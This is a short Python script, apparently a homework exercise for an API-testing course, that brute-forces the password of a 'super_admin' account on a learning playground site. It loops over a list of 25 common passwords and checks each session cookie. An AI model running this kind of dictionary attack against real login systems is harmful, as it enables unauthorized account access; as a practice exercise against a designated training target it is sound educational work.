import requests

login = "super_admin"
passwords = ["123456", "password", "123456789", "12345678", "12345", "1234567", "1234567890", "qwerty", "abc123", "111111", "123123", "admin", "welcome", "monkey", "login", "letmein", "dragon", "passw0rd", "football", "master", "hello", "freedom", "whatever", "qazwsx", "trustno1"]

for password in passwords:
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login": "super_admin", "password": password})
    cookie_value = response1.cookies.get('auth_cookie')
    cookies = {'auth_cookie': cookie_value}
    # print(cookies)

    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
     # print(response2.text)
    if response2.text == "You are authorized":
        print("Пароль найден! Это", password)





